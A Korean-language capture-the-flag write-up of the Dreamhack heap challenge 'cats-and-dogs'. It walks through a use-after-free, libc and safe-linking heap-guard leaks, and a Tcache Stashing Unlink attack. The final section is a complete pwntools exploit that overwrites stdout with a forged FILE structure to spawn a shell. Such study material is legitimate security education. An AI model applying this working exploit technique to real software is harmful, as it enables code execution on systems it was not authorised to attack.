---
title: "[DREAMHACK] cats-and-dogs writeup"
date: 2026-02-26 10:30:30
categories: Essay
tags: [writeup]
---

**필요할 때만 gdb 켜서 주소가 심히 자주 바뀝니다. ㅈㅅ**
### 환경 설정
컨테이너 하나 만들고 `libc.so.6`, `ld-linux-x86-64.so.2`  
빼오고.. `patchelf`로 두 파일을 `./main`에 패치 ㄱㄱ  
혹시나 나중에 뭐 해보고 싶은 거 있을 수 있으니까 `main_patched`로 하던지  
`libc6_2.35-0ubuntu3.9_amd64` << `libc.rip`에서 오프셋으로 확인함

```bash
patchelf --replace-needed libc.so.6 ./libc.so.6 ./prob
patchelf --set-interpreter ld-linux-x86-64.so.2 ./prob
```
늘 `u2204` 컨테이너를 애용하고 있음.

# 정적 분석
늘 느끼는 생각인데.. 디컴파일러를 진짜 디컴파일만 하려고 쓰는 사람은 아마  
나밖에 없지 않을까... GPT들도 있는데..  
사용법 아직까지 제대로 안 익히고 코드 보는 나는 참 바보같다..  

분석을 시작하겠음.  

늘 그랬지만 `file`로 `Stripped`가 아닌지 확인하고 gdb로 보려고 했지만..  
ㅇㄴ 코드 개 길다 ㄹㅇ;;  
```bash
(대충 파일 정보)...not stripped
```

심볼 살아있으니까 확인하면  
```bash
                 w __gmon_start__
                 U __isoc99_scanf@GLIBC_2.7
                 U __libc_start_main@GLIBC_2.34
                 U __stack_chk_fail@GLIBC_2.4
                 U _exit@GLIBC_2.2.5
                 U free@GLIBC_2.2.5
                 U malloc@GLIBC_2.2.5
                 U printf@GLIBC_2.2.5
                 U puts@GLIBC_2.2.5
                 U read@GLIBC_2.2.5
                 U setvbuf@GLIBC_2.2.5
                 U write@GLIBC_2.2.5
...
0000000000401256 T print_menu
00000000004012fc T get_cat
0000000000401419 T release_cat
00000000004014f2 T see_cat
00000000004015b5 T pet_cat
0000000000401693 T get_dog
00000000004017b0 T release_dog
0000000000401889 T see_dog
000000000040194c T pet_dog
0000000000401a2a T main
...
0000000000404080 B stdout@GLIBC_2.2.5
0000000000404090 B stdin@GLIBC_2.2.5
00000000004040a0 B stderr@GLIBC_2.2.5
00000000004040a8 b completed.0
00000000004040c0 B cats
0000000000404140 B dogs
0000000000404160 B cats_occupied
00000000004041a0 B dogs_occupied
00000000004041a8 B _end
```
... 볼 애들은 대략적으로 이렇게 됨. 그야 롸업 쓸 시점이니까..  
보호기법도 확인 ㄱㄱ  
```bash
[*] '/root/pwn/main'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3ff000)
 
```
어짜피 `FSOP` 공부하려고 이 문제 태그 확인해서 풀러온 거라 `RELRO` 여부는 중요하지 않음...  
일단은. 암튼 일단임 ㅇㅇ.  
`PIE`가 없는데 `5단계`... 합리적 의심 해봐야함 이거  


`IDA`로 바로 까봅시다 거  
쿵짝짝쿵짝짝쿵짝짝~  

```c
int print_menu()
{
  puts("1. Get a cat");
  puts("2. See a cat");
  puts("3. Pet a cat");
  puts("4. Release a cat");
  puts("5. Get a dog");
  puts("6. See a dog");
  puts("7. Pet a dog");
  puts("8. Release a dog");
  puts("9. Exit");
  return printf("Enter your choice: ");
}
```

메뉴는 간단함.  
각 메뉴의 동작이 `cat/dog/exit` 이렇게 구분되어 있다고 생각하면 됨.  
그러므로 `cat` 계열 분석하고, 나머지는 코드로 분석하지 않겠음.  

## 1. `get_cat()`
**분석은 `IDA`로 진행됨**
`get_cat()`의 처음 부분에는 아래 코드가 있음.  

```c
printf("Enter index (0-%d) to get a cat: ", 15);
__isoc99_scanf("%d", &v2);
```

그리고 첫 조건 쌍은 이러함.  
```c
if ( v2 < 0x10 ) {...}
else
  {
    puts("Invalid index!");
  }
```

`if`문 안에는,
```c
if ( cats_occupied[v2] )
    {
      printf("A cat alraedy occupied index %d!\n", v2);
    }
    else
    {
      v0 = v2;
      cats[v0] = malloc(0x90uLL);
      cats_occupied[v2] = 1;
      printf("A cat now occupies %d!\n", v2);
    }
```
즉, `0x10`보다 작은 인덱스라면  
`cats_occupied[해당 인덱스]`가 `1`인지 확인하고 그렇지 않다면 메모리를 할당해 줌.  

여기서는 딱히 문제될 게 없다고 판단  

## 2. `see_cat()`
`get_cat()`과 같이 인덱스를 받음.  
인덱스 검사 또한 위와 동일, 구체적으로는  
```c
if ( v1 < 0x10 )
  {
    printf("A cat says: ");
    write(1, (const void *)cats[v1], 0x90uLL);
  }
  else
  {
    puts("Invalid index!");
  }
```
이렇게 생김. `0x90`만큼 할당해 줬으니, 보여줄 때도 `0x90`만큼 보여주는 듯함.  
문제는 **`cats`가 할당 해제되었을 때, 접근이 가능하단 점임**

## 3. `pet_cat()`
유효성 검사 자체는 똑같을 뻔 했는데, `cats_occupied[idx]`를 활용해 존재 여부를 판단함.  

```c
if ( v1 < 0x10 && cats_occupied[v1] )
  {
    printf("Show me your word: ");
    read(0, (void *)cats[v1], 0x90uLL);
  }
  else
  {
    puts("Invalid index!");
  }
```
그러고선 `0x90`만큼 입력을 받음. 이 녀석도 `see_cat()`과 동일한 문제를 가짐.  

## 4. `rel_cat()`
대망의 마지막 함수.  
```c
if ( v1 < 0x10 )
  {
    free((void *)cats[v1]);
    cats_occupied[v1] = 0;
    printf("A cat at index %d is now released!\n", v1);
  }
  else
  {
    puts("Invalid index!");
  }
```
존재하는지 판단도 제대로 하지 않고 해제시켜줌. `입력값 < 0x10`이 조건이라..  
`UAF` 가능 ㅋ

`***_dog()` 친구들은 크기(`0x100`), 그리고 최대 생성 가능한 수량이 `2개`라는 점을 빼면 로직이 똑같음.  

여기까지 보고 생각할 수 있는 점은  
그냥 다 먹을 수 있다. 그 점임.  

가장 급한 거. `FSOP` 페이로드는 절대 적지 않고 크기가 거대하다.  
내가 만들어 본 가장 작은게 `0xe0` 정도. 그래서 `dog`를 잘 써야 할 듯 하다.  

`exit`를 통한, 그러니까 `_IO_cleanup()`쪽을 해도 된다.아마도..  
하지만 여기선 `printf/puts`를 사용해 트리거 했다!!

필자 깃허브를 봐도 알겠지만, 이미 드림핵 강의 보면서 그걸 2번 정도는 했다.  
그리고 둘 다 너무 쉽게.. `pwntools`의 `FileStructure()`를 통해 작성하기도 했고.. 또한 `FSOP`를 처음 접할 때 `xsputn()` 쓰는 걸 가장 많이 봤다.  
그거 때문이기도 함 ㅇㅇ

즉... 내 바보같은 이론은 이렇다:  
내가 많이 본 것도 못 하는데, 내가 배운 건 제대로 쓸 수 있을까?  

이 문제에 들인 시간이 좀 길어서, 롸업의 질을 떨어뜨린 점은 죄책감이 들긴 함.  

추가로, 예전엔 처음보는 문제를 롸업을 보고 따라 익스플로잇하기도 했는데,  
이 때 `exit()`를 트리거 시키지 못해 하루종일 고생한 기억 때문이기도 하다.  
핑계야 많다. 이 문제가 내 밥에 독을 탔다... 라거나.. 다 말도 안 되는 이유...  

**정리!!**
- `stdout`이 `가짜 파일 구조체`를 가리키게 해서  
- `printf/puts`를 호출할 경우 쉘 따기.  

지금부터는 힙을 건드려야 함. 고생한 걸 하나하나 따라오게 하고 싶지만  
롸업이라 그런 건..

# 동적 분석
`libc base`, `heap base`를 구하고 시작하겠다.  
위에서 정리하며 청크 읽고 쓰는 걸 목표로 잡았기 때문이다.  

..그러기 전에, `exit` 선택지를 제외한 모든 메뉴의 옵션을 여러번 사용할 예정이니  
함수로 구현해 두었다.  

```python
def get_cat(idx):
    sla(b'Enter your choice: ', b'1')
    sla(b':', str(idx).encode())

def see_cat(idx):
    sla(b'Enter your choice: ', b'2')
    sla(b':', str(idx).encode())
    ru(b'says: ')
    return r(0x90)

def pet_cat(idx, v):
    sla(b'Enter your choice: ', b'3')
    sla(b':', str(idx).encode())
    sa(b':', v)

def rel_cat(idx):
    sla(b'Enter your choice: ', b'4')
    sla(b':', str(idx).encode())

def get_dog(idx):
    sla(b'Enter your choice: ', b'5')
    sla(b':', str(idx).encode())

def see_dog(idx):
    sla(b'Enter your choice: ', b'6')
    sla(b':', str(idx).encode())
    ru(b'says: ')
    return r(0x100)

def pet_dog(idx, v):
    sla(b'Enter your choice: ', b'7')
    sla(b':', str(idx).encode())
    sa(b':', v)

def rel_dog(idx):
    sla(b'Enter your choice: ', b'8')
    sla(b':', str(idx).encode())
```

`tcache bin`에는 `libc` 쪽 주소가 없다.  
그냥 빠르게 저장되는 친구들이라 ㅋ  
`main_arena`를 읽어보자. `unsorted bin`으로 보내는 게 첫 목적이다.  

`top chunk`에 병합될 수 있지 않을까라는 생각을 염두에 둬야 한다.  
해보고 나서야 깨달은 점이다.  

`tcache bin`은 최대 7개, 이 7개를 채우면 그 다음 녀석은  
`unsorted bin`으로 간다. 이 쪽은 이중 연결 리스트 구조기도 하고,  
`main_arena`가 앞에 있을 예정이다.   
이 녀석과 `libc`가 매핑된 주소의 차를 구하고 그걸 오프셋으로 활용한다.  
이 녀석이 `libc`를 기준으로 매핑되는 녀석이라 그렇다.  

정리하자면, `tcache bin`용 7개, `top chunk` 병합 방지 1개,  
`unsorted bin`용 1개.. 총 9개가 필요하다.

```python
for i in range(9):
    get_cat(i)

for i in range(3, 9):
    rel_cat(i)

# 남은 건 cat0, 1, 2
```

`cat0`, `cat1`, `cat2`를 여기서 버리긴 아깝다.  
이따 `FSOP` 페이로드를 쓸 때 활용하기 위해  
가짜 `small bin` 구조를 만드는 데 사용하겠다.  
`cat1은 중간에 넣을 예정이라, 기억하기 쉽게 가장 마지막에 `tcache bin`에 넣어뒀다.  


이걸로 `unsorted bin` 맨 앞... 암튼 맨 앞이다. `cat0`의 `fd`는  
`main_arena`, 그리고 `cat2`의 `bk`가 또한 `main_arena`를 가리키게 된다.  

정적분석을 참고하면, 읽을 때는 앞에서 부터 읽을 수 있다.  
그러니까, `see_cat()` 으로는 청크 상태의 `cat0`의 앞부분을 읽으니, `fd`만 읽을 수 있다고 확인 가능하다.  

```python
rel_cat(0)
rel_cat(2)
```

`unsorted bin`의 `main_arena` 오프셋을 모르니 확인해보자.  
난 초보자라 `pwndbg` 쓴다.
```bash
pwndbg> tcachebin
tcachebins
0xa0 [  7]: 0x29dd340 —▸ 0x29dd7a0 —▸ 0x29dd700 —▸ 0x29dd660 —▸ 0x29dd5c0 —▸ 0x29dd520 —▸ 0x2
9dd480 ◂— 0x0
pwndbg> x/15gx &cats
0x4040c0 <cats>:        0x00000000029dd2a0      0x00000000029dd340
0x4040d0 <cats+16>:     0x00000000029dd3e0      0x00000000029dd480
0x4040e0 <cats+32>:     0x00000000029dd520      0x00000000029dd5c0
0x4040f0 <cats+48>:     0x00000000029dd660      0x00000000029dd700
0x404100 <cats+64>:     0x00000000029dd7a0      0x0000000000000000
0x404110 <cats+80>:     0x0000000000000000      0x0000000000000000
0x404120 <cats+96>:     0x0000000000000000      0x0000000000000000
0x404130 <cats+112>:    0x0000000000000000
```
아주 잘 들어가 있다...가 아니라 `unsorted bin`을 봐야하지. 참..  
내가 환경설정을 제대로 하지 않아 힙을 자동으로 감지하지 않는다.  
`set resolve-heap-via-heuristic`, 줄여서 `set resolve` 명령어로 인식하게 어떻게든 만들었다..  

`tcache bin`은 유저 데이터 주소를 저장한다.  
롸업 적다가 자꾸 헷갈려서 여기에도 적어놨다.

```bash
pwndbg> unsorted
unsortedbin
all: 0x29dd3d0 —▸ 0x29dd290 —▸ 0x73550ca1ace0 ◂— 0x29dd3d0
pwndbg> 
```
헤더 주소가 잘 들어가 있다. 맨 오른쪽에서 2번째, `0x73...`가 `main_arena`의 주소다.  
옆쪽(왼쪽)으론 `cat0`, `cat2`가 놓여있는 모습을 확인할 수 있다.  

```bash
pwndbg> vmmap libc
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
    0x73550c800000     0x73550c828000 r--p    28000 0      /root/pwn/libc.so.6
    0x73550c828000     0x73550c9bd000 r-xp   195000 28000  /root/pwn/libc.so.6
    0x73550c9bd000     0x73550ca15000 r--p    58000 1bd000 /root/pwn/libc.so.6
    0x73550ca15000     0x73550ca16000 ---p     1000 215000 /root/pwn/libc.so.6
    0x73550ca16000     0x73550ca1a000 r--p     4000 215000 /root/pwn/libc.so.6
    0x73550ca1a000     0x73550ca1c000 rw-p     2000 219000 /root/pwn/libc.so.6
```
`main_arena`의 오프셋을 구하면   
```bash
pwndbg> p/x 0x73550ca1ace0-0x73550c800000
$1 = 0x21ace0
```
위와 같은 결과를 받는다.  
다음과 같이 처리하면 된다:
```python
main_arena = 0x21ace0
leak = u64(see_cat(0)[:8].ljust(8, b'\x00'))
lb = leak - main_arena
libc.address = lb
slog("libc_base", lb)
```

`libc_base`를 구했습니다!!! 그래봤자 할 수 있는 건 쓸 함수 주소 구하기..  
쓸 수 있는 영역은 애초에 하나였습니다.  

**청크**에 쓸 겁니다. 

근데 그러려면 **기준점이 될 힙 주소**를 알아야 함.  
`tcache bin` 끝자락에 있는 녀석들은 `cat3`, 그리고 `cat4`임.  
읽을 수 있는 부분은 `fd`.  

만약 `Safe Linking`이 뭔지 몰랐다? 여기서 바로 막혀버림 그냥 ㅇㅇ.  
`cat3` 다음은 없으니까, (단일 연결 리스트) 이 녀석의 `fd`는 아래와 같음  

`(cat3)fd =  0 ^ (cat3 >> 12)` (여기서 cat3은 주소를 의미함)  
따라서 `(cat3)fd = (cat3 >> 12)`

`cat4`는 `cat3`을 다음으로 가지는 녀석이라 반복해서 이용하면 됨.  
`(cat4)fd = cat3 ^ (cat4 >> 12)`
`guard` 자체는 아까 `cat3` 에서 구한 거 쓰면 됨(가까운 청크라서)  

`cat3`의 주소는  
`cat3 = (cat4)fd ^ guard`...    

기준점은 `cat3`의 주소로 잡고 청크들을 다룰 것이다.  
```python
guard = u64(see_cat(3)[:8].ljust(8, b'\x00'))
chunk = u64(see_cat(4)[:8].ljust(8, b'\x00')) ^ guard

slog("heap guard", guard)
slog("chunk addr", chunk)
```

이따 쓸 때 `guard`도 필요해서 변수로 만들어 두었다.  

필요한 준비물은 모두 모였다. 이제 쓸 차례다.  
물론 쓰려면.. `Tcache Stashing Unlink Attack`!!!!  
일명 `TSU`를 알고 있을 경우에 쉽게 쉽게 넘어간다.  
난 몰랐다. 드림핵에서 힘들게 힙 내용 겨우 보면서 이해함.  
끔찍하다는 말밖에.. 이 공격 기법은 `fake chunk`를 좀 엮어서  
`tcache bin`에 보내는 느낌이다.  

아까 쓰겠다고 한 `cat0`, `cat1`, `cat2`를 사용하겠다.  
일단 `small bin`에 아무도 안 계시니, 이쪽으로 이동을 시켜보자.  

```python
get_dog(0)
```
이 한 줄이면 된다. 아까전에 `unsorted bin`으로 `cat0`과 `cat2`를 순서대로 보냈다.  
`dog`의 크기는 `0x100`, 헤더까지 포함해서 `0x110`이다.  
`tcache bin`에는 다 작은 애들밖에 없고, 따라서 `unsorted bin`으로 살펴보러 감.  
`cat0`, `cat2`를 순서로 확인함. 둘 다 크기가 맞지 않으니 훑어보는 겸 해서  
`small bin`으로 얘네를 이동시킴 ㅇㅇ.  

레퍼런스 달아놓을 예정이라 걱정하지 마시고 읽으셔도 됩니다 ㅋ  
암튼 `small bin` 앞쪽에 `cat0`이 가게 되는데, 우리가 할  
`TSU`를 위해선 `small bin`과 이어지는 구조를 만들어야 해서 이 `entry` 주소를 얻어야 함.  

`see_cat()`으로 저장하면 됨.  

```python
smallbin = u64(see_cat(0)[:8].ljust(8, b'\x00'))
slog("smallbin_entry", smallbin) # 재활용해서 주소 가져옴
```

`cat1`을 꺼내서 `cat0`, `cat2`와 `small bin` 내에서 연결된 것 처럼 꾸며야 함. 
그러나 `cat1`만 수정해서 될 리가 있나. `fd`랑 `bk`를 바꿔야 하는데.  
그래서 어짜피 안 쓰는 `cat8`까지 꺼냄.  

즉, `cat1`의 정보 수정 + `occupied` 때문에 `cat0` 및 `cat2`에 접근 불가,   
따라서 `tcache`로 보낸 다음 의도적으로 할당되게 하여 수정.. 하는 것임.  
나 좀 천재인듯 ㅋ  

```python
get_cat(1) # cat1
get_cat(9) # cat8
# tcachebin: 7, 6, 5, 4, 3

pet_cat(1, p64(chunk-0x1f0) + p64(chunk-0xb0)) # 아까 smallbin으로 보낸 cat0, cat2의 주소
# cat1의 fd = chunk-0x1f0(cat0)
# cat1의 bk = chunk-0xb0(cat2)
```

이거 끝나고 `gdb`로 깔짝하며 확인할 경우..  
```bash
pwndbg> x/10gx &cats
0x4040c0 <cats>:        0x00000000289422a0      0x0000000028942340
0x4040d0 <cats+16>:     0x00000000289423e0      0x0000000028942480
0x4040e0 <cats+32>:     0x0000000028942520      0x00000000289425c0
0x4040f0 <cats+48>:     0x0000000028942660      0x0000000028942700
0x404100 <cats+64>:     0x00000000289427a0      0x00000000289427a0
pwndbg> tcachebin
tcachebins
0xa0 [  5]: 0x28942700 —▸ 0x28942660 —▸ 0x289425c0 —▸ 0x28942520 —▸ 0x28942480 ◂— 0x0
```
`tcache bin` 상태가 잘 남아있고,  
```bash
pwndbg> x/2gx 0x0000000028942340
0x28942340:     0x0000000028942290      0x00000000289423d0
pwndbg> smallbin
smallbins
0xa0: 0x289423d0 —▸ 0x28942290 —▸ 0x75e5f881ad70 ◂— 0x289423d0
pwndbg> 
```

수정이 아주 잘 되어있는 걸 볼 수 있다 ㅎㅎㅎ..  
멘탈 나갈 것 같다.  

앞서 말했듯 이제 `tcache bin`으로 보낼 차례다.  
```python
rel_cat(0)
rel_cat(2)
# tcachebin: 2, 0, 7, 6, 5, 4, 3
```

리스트를 만들고.. 주소에 쓰고... 페이로드 공간에 쓰고..  
주소가 그 페이로드 가리키게 하고.. 머리가 아프다. 뭔가 꼬인 느낌.  

바로 그거다. `cat0`과 `cat2`를 꼬아야 한다.  

포인터가 아직 `small bin`에서 사라지지 않고 남아있다.  
그리고 `tcache`에는 필요 없는 녀석들이 있고..  
그리고 `small bin`에 있었던 녀석들(`cat0`, `cat2`)를 써야 하니  
`tcache`에서 못 가져오게 해야 한다. 이 생각들은 모두 하나로 귀결되는데..  

```python
get_cat(0) # cat2
get_cat(2) # cat0
# tcachebin: 7, 6, 5, 4, 3

# cat0 <-> cat1 <-> cat2
pet_cat(2, p64(smallbin) + p64(chunk - 0x150)) # cat0, fd=smallbin, bk=cat1
pet_cat(0, p64(chunk + 0x150) + p64(smallbin)) # cat2, fd=cat1, bk=smallbin

for i in range(3, 8): # tcache 비우기
    get_cat(i)
```

바로 마지막 `cat`, 그 `cat2`를 `stdout`을 나타내는 주소로 쓰는 거다.  
구라다. `cat1`을 `stdout`로 가리키게 할 거다.  
아. 이게 아닌데. 내 저능한 언어 실력이 밝혀지고 말았다.  

이제 청크가 `stdout`을 가리키게 해야 한다.. 정확히는, 할당 받았을 때.  
그 `cat`이 `stdout`이어야 한다.  

`tcache`로 보내야 하니 `tcache stashing`을 해버리자.  
그러려면 하나를 할당 받아야 하니 수가 없어진다고 여기면 되는데,  

아직 세 발이 남아서 괜찮다.  
```python
get_cat(10) # tcache-> 비어있음, fastbin은 애초에 크기 커서 그 쪽으로 갈 일 없음, smallbin에서 가져옴 cat0 가져감
```

보내고 나면 
```bash
pwndbg> tcachebin
tcachebins
0xa0 [  2]: 0x1e4573e0 —▸ 0x1e457340 ◂— 0x0
pwndbg> x/20gx &cats
0x4040c0 <cats>:        0x000000001e4573e0      0x000000001e457340
0x4040d0 <cats+16>:     0x000000001e4572a0      0x000000001e457700
0x4040e0 <cats+32>:     0x000000001e457660      0x000000001e4575c0
0x4040f0 <cats+48>:     0x000000001e457520      0x000000001e457480
0x404100 <cats+64>:     0x000000001e4577a0      0x000000001e4577a0
0x404110 <cats+80>:     0x000000001e4572a0      0x0000000000000000
0x404120 <cats+96>:     0x0000000000000000      0x0000000000000000
0x404130 <cats+112>:    0x0000000000000000      0x0000000000000000
```

이렇게 남는다. 하하하!!! 놀라지 마시라.  
`cat0`은 이미 `cat2`를 나타낸 지 오래다. 절대 내가 헷갈려서 기억하려고  
여기에 적은 것이 아니다.  

`small bin`에 있던 `cat0`을 할당 받고, 뒤에 있던 `cat1`, `cat2`..얘네가  
`cat2 <-> cat1 <-> cat0` 이렇게 있다가 `tcache bin`으로 들어간 거임.  

`cat2`의 `fd`를 바꿔 `cat1`이 있을 자리를 `stdout`으로 대체하고  
`cat2`를 버린 뒤 `stdout`을 받을 거임 ㅇㅇ.  

아까 받은 `guard`를 적절히 사용해서 바꿔주고
```python
pet_cat(0, p64(elf.sym['stdout'] ^ guard)) # stdout, 원래 cat2가 담겨있었음

get_cat(11) # cat2
get_cat(12) # cat1

stdout = chunk + 0x4d0 # 맨 뒤 청크의 뒤쪽 부분
wfile = libc.sym["_IO_wfile_jumps"]
system = libc.sym["system"]
lock = lb + 0x21ca70 # 원래 _lock 주소에 있던 거 그대로 쓰기
```

나머지 주소는 디버깅으로 확인 가능함.  
원래 `_IO_2_1_stdout_`의 생김새는 아래와 같음.

```bash
pwndbg> x/30gx &_IO_2_1_stdout_
0x7b8e08c1b780 <_IO_2_1_stdout_>:       0x00000000fbad2887      0x00007b8e08c1b803
0x7b8e08c1b790 <_IO_2_1_stdout_+16>:    0x00007b8e08c1b803      0x00007b8e08c1b803
0x7b8e08c1b7a0 <_IO_2_1_stdout_+32>:    0x00007b8e08c1b803      0x00007b8e08c1b803
0x7b8e08c1b7b0 <_IO_2_1_stdout_+48>:    0x00007b8e08c1b803      0x00007b8e08c1b803
0x7b8e08c1b7c0 <_IO_2_1_stdout_+64>:    0x00007b8e08c1b804      0x0000000000000000
0x7b8e08c1b7d0 <_IO_2_1_stdout_+80>:    0x0000000000000000      0x0000000000000000
0x7b8e08c1b7e0 <_IO_2_1_stdout_+96>:    0x0000000000000000      0x00007b8e08c1aaa0
0x7b8e08c1b7f0 <_IO_2_1_stdout_+112>:   0x0000000000000001      0xffffffffffffffff
0x7b8e08c1b800 <_IO_2_1_stdout_+128>:   0x000000000a000000      0x00007b8e08c1ca70
0x7b8e08c1b810 <_IO_2_1_stdout_+144>:   0xffffffffffffffff      0x0000000000000000
0x7b8e08c1b820 <_IO_2_1_stdout_+160>:   0x00007b8e08c1a9a0      0x0000000000000000
0x7b8e08c1b830 <_IO_2_1_stdout_+176>:   0x0000000000000000      0x0000000000000000
0x7b8e08c1b840 <_IO_2_1_stdout_+192>:   0x00000000ffffffff      0x0000000000000000
0x7b8e08c1b850 <_IO_2_1_stdout_+208>:   0x0000000000000000      0x00007b8e08c17600
0x7b8e08c1b860: 0x00007b8e08c1b6a0      0x00007b8e08c1b780
pwndbg> 
```

`0x4d0` 오프셋은 구한 `cat3`를 기준으로 `x/200gx` 찍으면  
광활하게 빈 부분을 발견해서 사용했다.

```bash
pwndbg> vmmap heap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
        0x1e457000         0x1e478000 rw-p    21000 0      [heap]
```

...권한 확인은 필수..  

`FSOP` 하려다가 지금 몇 개가 얻어걸린 건 지는 모르겠다..  
9렙까지 쭉 밀고 나서 겪었던 개념들을 오늘 배운 `TSU`라던지..  

얘네로 따로 파고 갈 생각이기도 하다.. 할 수 있을 지는 모르겠다.  

이런 미친... 이거 꿈꾸다 나오는 거 아니냐..

# 익스플로잇
그래서.. 정리하면  

```python
#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"
context.binary = elf = ELF('./main')
# context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]

HOST, PORT = "host3.dreamhack.games 8296".split()

def slog(n, a): return info(": ".join([n, hex(a)]))

s       = lambda data               :p.send(data)
sa      = lambda delim, data        :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim, data        :p.sendlineafter(delim, data)
r       = lambda num=4096           :p.recv(num)
rl      = lambda                    :p.recvline()
ru      = lambda delim, drop=True   :p.recvuntil(delim, drop)
l64     = lambda                    :u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
uu64    = lambda data               :u64(data.ljust(8, b'\x00'))

if args.REMOTE:
    p = remote(HOST, PORT)
    libc = ELF('./libc.so.6') # or other exact path
else:
    p = process(env={"LD_PRELOAD":"./libc.so.6"}) # or env can be added
    libc = ELF('./libc.so.6')

def get_cat(idx):
    sla(b'Enter your choice: ', b'1')
    sla(b':', str(idx).encode())

def see_cat(idx):
    sla(b'Enter your choice: ', b'2')
    sla(b':', str(idx).encode())
    ru(b'says: ')
    return r(0x90)

def pet_cat(idx, v):
    sla(b'Enter your choice: ', b'3')
    sla(b':', str(idx).encode())
    sa(b':', v)

def rel_cat(idx):
    sla(b'Enter your choice: ', b'4')
    sla(b':', str(idx).encode())

def get_dog(idx):
    sla(b'Enter your choice: ', b'5')
    sla(b':', str(idx).encode())

def see_dog(idx):
    sla(b'Enter your choice: ', b'6')
    sla(b':', str(idx).encode())
    ru(b'says: ')
    return r(0x100)

def pet_dog(idx, v):
    sla(b'Enter your choice: ', b'7')
    sla(b':', str(idx).encode())
    sa(b':', v)

def rel_dog(idx):
    sla(b'Enter your choice: ', b'8')
    sla(b':', str(idx).encode())

# libc6_2.35-0ubuntu3.9_amd64
main_arena = 0x21ace0

# one for the guard lol
for i in range(9):
    get_cat(i)

for i in range(3, 9):
    rel_cat(i)

rel_cat(1)
# tcache: 1, 8, 7, 6, 5, 4, 3

# leak heap guard
guard = u64(see_cat(3)[:8].ljust(8, b'\x00'))
chunk = u64(see_cat(4)[:8].ljust(8, b'\x00')) ^ guard

slog("heap guard", guard)
slog("chunk addr", chunk)

# unsortedbin
# main_arena->cat2->cat0->main_arena
rel_cat(0)
rel_cat(2)

leak = u64(see_cat(0)[:8].ljust(8, b'\x00'))
lb = leak - main_arena
libc.address = lb
slog("libc_base", lb)

get_dog(0) # smallbin에 0, 2 들어가고
# unsortedbin: 0

smallbin = u64(see_cat(0)[:8].ljust(8, b'\x00'))
slog("smallbin_entry", smallbin) # 재활용해서 주소 가져옴

get_cat(1) # cat1
get_cat(9) # cat8
# tcachebin: 7, 6, 5, 4, 3

pet_cat(1, p64(chunk-0x1f0) + p64(chunk-0xb0)) # 아까 smallbin으로 보낸 cat0, cat2의 주소
# cat1의 fd = chunk-0x1f0(cat0)
# cat1의 bk = chunk-0xb0(cat2)

# cat0, cat2를 smallbin에서 tcache로 넘김!!! bin에 연결되어 있는지 검사하지 않음.
rel_cat(0)
rel_cat(2)
# tcachebin: 2, 0, 7, 6, 5, 4, 3

get_cat(0) # cat2
get_cat(2) # cat0
# tcachebin: 7, 6, 5, 4, 3

# cat0 <-> cat1 <-> cat2
pet_cat(2, p64(smallbin) + p64(chunk - 0x150)) # cat0, fd=smallbin, bk=cat1
pet_cat(0, p64(chunk + 0x150) + p64(smallbin)) # cat2, fd=cat1, bk=smallbin

for i in range(3, 8): # tcache 비우기
    get_cat(i)

# cat3~7: 7,6,5,4,3 -> 뺄 목적이라 메모가 의미 없긴 함
# tcache: 0

get_cat(10) # tcache-> 비어있음, fastbin은 애초에 크기 커서 그 쪽으로 갈 일 없음, smallbin에서 가져옴 cat0 가져감

gdb.attach(p)
pause()

pet_cat(0, p64(elf.sym['stdout'] ^ guard)) # stdout, 원래 cat2가 담겨있었음

get_cat(11) # cat2
get_cat(12) # cat1

stdout = chunk + 0x4d0 # 맨 뒤 청크의 뒤쪽 부분
wfile = libc.sym["_IO_wfile_jumps"]
system = libc.sym["system"]
lock = lb + 0x21ca70 # 원래 _lock 주소에 있던 거 그대로 쓰기

# wfile 잘 사용하기 ww
pay = b"  sh\x00\x00\x00\x00"
pay += p64(0) * 3 # read_*
pay += p64(0) * 3 # write_base, write_ptr, write_end
pay += p64(0) * 2 # buf_base, buf_end
pay += p64(0) * 4 # ...to the _makers
pay += p64(system) # wide_vtable + 0x68
pay += p64(1)
pay += p64(0xffffffffffffffff) # 기본값 사용
pay += p64(0)
pay += p64(lock)
pay += p64(0xffffffffffffffff) # 기본값 사용
pay += p64(0)
pay += p64(stdout - 0x10) # wide_data
pay += p64(0) * 3
pay += p64(0) # <= 0
pay += p64(0)
pay += p64(stdout) # wide_vtable
pay += p64(wfile) # vtable

print(hex(len(pay)))
assert len(pay) == 0xe0

get_dog(1)
pet_dog(1, pay) # 담아뒀다가
pet_cat(12, p64(chunk + 0x4d0)) # stdout에 쓰기

p.interactive()
```

미치겠네.. 170줄은 뭐냐